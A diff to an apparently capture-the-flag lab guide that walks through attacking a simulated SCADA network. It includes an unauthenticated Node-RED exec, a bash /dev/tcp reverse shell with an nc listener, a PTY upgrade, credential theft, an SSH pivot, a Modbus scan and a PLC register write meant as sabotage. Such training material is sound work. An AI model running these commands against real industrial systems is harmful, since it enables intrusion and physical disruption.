@@ -41,58 +41,66 @@ This checklist and step-by-step recording guide ensures you capture all the nece
 
 ---
 
-### Section 2: SCADA Subnet Scan & HMI Discovery (Duration: ~1m)
+### Section 2: SCADA Subnet Scan & HMI Discovery — Level 2 (Duration: ~1m)
 1. **Network Discovery (Level 2):** From your Kali attacker host, scan the operations subnet to identify the active HMI host:
    ```bash
    nmap -p 1880 --open 192.168.100.0/24
    ```
-   Show that port `1880` is open on IP `192.168.100.10`.
-2. **Access Editor:** Open the browser and navigate to the unauthenticated Node-RED interface:
-   `http://192.168.100.10:1880/`
-3. **Flow Verification:** Show the simple flow: an `inject` node wired to an `exec` node.
-4. **Payload Inspection:** Double-click the `exec` node to show the shell command:
-   ```bash
-   bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
-   ```
-5. **Listener Setup:** Switch to the Kali terminal and show you starting the listener:
-   ```bash
-   nc -nlvp 4444
-   ```
-6. **Execution (Level 3):** Switch back to the browser, click **Deploy**, and then click the square button on the `inject` node to trigger the reverse shell.
+   Show that port `1880` is open on IP `192.168.100.10`. Submit the answer `192.168.100.10:1880`.
 
 ---
 
-### Section 3: Interactive TTY Upgrade & Credentials (Duration: ~1m)
-1. **Dumb Shell Demonstration:** Switch to the terminal. Show that the connection from `192.168.100.10` has been caught.
-2. **Demonstrate Constraint:** Attempt to run `ssh operator@192.168.20.20`. Show that the cursor hangs or fails to capture the password input because there is no controlling PTY. Press `Ctrl+C`.
-3. **TTY Upgrade:** Run the Python PTY upgrade snippet:
+### Section 3: SCADA HMI Exploitation — Level 3 (Duration: ~1m)
+1. **Access Editor:** Open the browser and navigate to the unauthenticated Node-RED interface:
+   `http://192.168.100.10:1880/`
+2. **Build Execution Flow:** Drag an `inject` node, `exec` node, and `debug` node onto the canvas. Wire: inject → exec → debug.
+3. **Configure command:** Double-click the `exec` node and set the command to:
    ```bash
-   python3 -c 'import pty; pty.spawn("/bin/bash")'
+   cat /root/flag.txt
    ```
-   Show your prompt changing to `root@scada-hmi:~#`.
-4. **Credential Extraction (Level 4):** Read the leaked engineering credentials stored on the HMI filesystem:
+4. Click **Deploy**, then click the inject node trigger button.
+5. Show the flag `FLAG{SCADA_HMI_COMPROMISED}` appearing in the debug panel. Submit the answer.
+
+---
+
+### Section 4: Credential Access — Level 4 (Duration: ~30s)
+1. **Credential Extraction:** In the Node-RED exec node, change the command to:
    ```bash
    cat /home/debian/ews_credentials.txt
    ```
-   Show the output: `operator : operator123`. Copy the password `operator123`.
+2. Click **Deploy** and trigger. Show the output `operator : operator123` in the debug panel. Submit the password `operator123` as the answer.
 
 ---
 
-### Section 4: Lateral Movement Pivot & Recon (Duration: ~1m)
-1. **SSH Pivot:** From the HMI terminal, SSH into the Engineering Workstation:
+### Section 5: Reverse Shell, PTY Upgrade & Lateral Movement — Level 5 (Duration: ~2m)
+1. **Listener Setup:** Switch to the Kali terminal and start the TCP listener:
+   ```bash
+   nc -nlvp 4444
+   ```
+2. **Deploy Reverse Shell:** Go back to Node-RED. Change the exec node command to the reverse shell payload:
+   ```bash
+   bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
+   ```
+   Click **Deploy** and trigger. Switch to Kali — the connection from `192.168.100.10` should appear.
+3. **TTY Upgrade:** On the caught dumb shell, upgrade to a full interactive PTY:
+   ```bash
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+   ```
+   Show the prompt changing to `root@scada-hmi:~#`.
+4. **SSH Pivot:** From the upgraded HMI shell, SSH into the Engineering Workstation:
    ```bash
    ssh operator@192.168.20.20
    ```
    Type password `operator123` when prompted. Show the prompt changing to `operator@engineering-station:~$`.
-2. **Control Network Recon:** Run the targeted port scan to locate the PLC:
+5. **Control Network Recon:** Run the targeted port scan to locate the PLC:
    ```bash
    nmap -p 502 --open 192.168.20.0/24
    ```
-   Show port 502 (Modbus TCP) returning open on `192.168.20.10`.
+   Show port 502 (Modbus TCP) returning open on `192.168.20.10`. Submit `192.168.20.10` as the answer.
 
 ---
 
-### Section 5: Modbus Sabotage & Flag Verification (Duration: ~1m)
+### Section 6: Modbus Sabotage & Flag Verification — Level 6 (Duration: ~1m)
 1. **Sabotage Injection:** Write `0` to register 0 on the PLC using the Modbus CLI utility:
    ```bash
    modbus 192.168.20.10 0=0
